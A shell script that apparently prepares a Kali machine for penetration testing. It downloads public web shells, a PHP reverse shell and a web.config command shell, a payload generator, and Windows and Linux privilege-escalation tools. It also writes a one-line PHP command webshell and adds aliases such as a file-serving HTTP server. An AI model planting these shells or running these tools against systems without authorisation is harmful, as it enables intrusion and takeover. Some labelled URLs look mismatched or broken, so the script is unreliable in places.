#!/bin/sh

##packages
apt update
apt-get install -y seclists
apt-get install -y gobuster
apt-get install -y joplin
apt-get install -y konsole

## shells
mkdir /home/douglas/shells && cd /home/douglas/shells

### aspx cmd
wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/asp/cmd.aspx

### cmd war
wget https://github.com/SecurityRiskAdvisors/cmd.jsp/blob/master/cmd.jsp

### cmd jsp
wget https://github.com/SecurityRiskAdvisors/cmd.jsp/blob/master/cmd.war

### php one-liner
echo "<?php echo shell_exec(['cmd']); ?>" > oneliner.php

### php reverse shell
wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php

### shell command webconfig 
wget https://gist.githubusercontent.com/gazcbm/ea7206fbbad83f62080e0bbbeda77d9c/raw/8173f5041c9a69cc58e980717ebe044f8eff9e9f/shell%2520command%2520web.config -O cmd_web.config

### wwwolf webshell
wget https://raw.githubusercontent.com/WhiteWinterWolf/wwwolf-php-webshell/master/webshell.php -O wwwolfshell.php

## tools
mkdir /home/douglas/tools && cd /home/douglas/tools

###msfvenom payload creator
wget https://raw.githubusercontent.com/g0tmi1k/msfpc/master/msfpc.sh
chmod +x msfpc.sh

### ssh2john
wget https://raw.githubusercontent.com/openwall/john/bleeding-jumbo/run/ssh2john.py

### nmapautomator
wget https://raw.githubusercontent.com/21y4d/nmapAutomator/master/nmapAutomator.sh && chmod +x nmapAutomator.sh

### windows privesc
mkdir /home/douglas/tools/winprivesc/ && cd /home/douglas/tools/winprivesc

### windows exploit suggester
wget https://raw.githubusercontent.com/AonCyberLabs/Windows-Exploit-Suggester/master/windows-exploit-suggester.py

#### winpeas

wget https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/winPEAS/bin/x64/Release/winPEAS.exe -O 64Winpeas.exe

wget https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/winPEAS/winPEASexe/winPEAS/bin/x86/Release/winPEAS.exe -O 86Winpeas.exe

### linux privesc
mkdir /home/douglas/tools/linprivesc/ && cd /home/douglas/tools/linprivesc

#### linpeas
wget https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh

#### linenum
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh

#### linux-exploit-suggester
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh

#### lse
wget https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh

#### linuxprivchecker
wget https://raw.githubusercontent.com/sleventyeleven/linuxprivchecker/master/linuxprivchecker.py

#### pspy_all_versions
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64s
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy32
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy32s
chmod +x pspy*

## aliases

echo "alias automap='sudo bash /home/douglas/tools/nmapAutomator.sh'" >> /home/douglas/.zshrc
echo "alias simp='python -m SimpleHTTPServer'" >> /home/douglas/.zshrc
echo "alias msfpc='bash /home/douglas/tools/msfpc.sh'" >> /home/douglas/.zshrc

## swtich to plasma
apt-get update && apt-get install -y kali-defaults kali-root-login desktop-base kde-plasma-desktop
update-alternatives --config x-session-manager

## reboot
reboot
